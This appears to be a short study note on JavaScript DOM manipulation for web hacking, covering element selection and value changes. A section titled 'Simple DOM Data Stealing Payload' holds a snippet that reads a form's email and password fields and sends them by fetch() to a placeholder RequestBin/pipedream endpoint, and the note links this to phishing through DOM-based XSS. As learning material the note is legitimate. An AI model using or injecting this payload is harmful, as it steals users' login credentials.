# Introduction to DOM Manipulation (Web Hacking)

## Lessons learnt

> * The DOM is the structure of an HTML page that JavaScript can access and manipulate.
> * Hackers use the DOM to read or modify page content, steal data, inject forms, etc.
> * JavaScript can be used to hijack or manipulate elements dynamically.
----

## 🧰 Basic DOM Commands

### Select Elements

```js
// By ID
document.getElementById("email")

// By class name
document.getElementsByClassName("input")

// By tag name
document.getElementsByTagName("form")

// Query selectors (CSS-style)
document.querySelector("input[type='password']")
```

### Modify Values

```js
// Get input value
let email = document.getElementById("email").value;

// Change text content
document.querySelector("h1").textContent = "Hacked";

// Change background
document.body.style.background = "black";
```

---

## Simple DOM Data Stealing Payload

```js
let email = document.getElementById("email").value;
let pass = document.getElementById("password").value;
fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&password=" + pass);
```

> This sends the victim's email and password to your server.

---

## Challenge I practiced

practice:

* Located the email and password input on a form.
* Used `console.log()` to test capturing the data.
* Sent it to my own endpoint using `fetch()`.

---

## Real-World Application

This is how real phishing scripts silently steal login credentials using JavaScript injected via DOM-based XSS or HTML Injection.
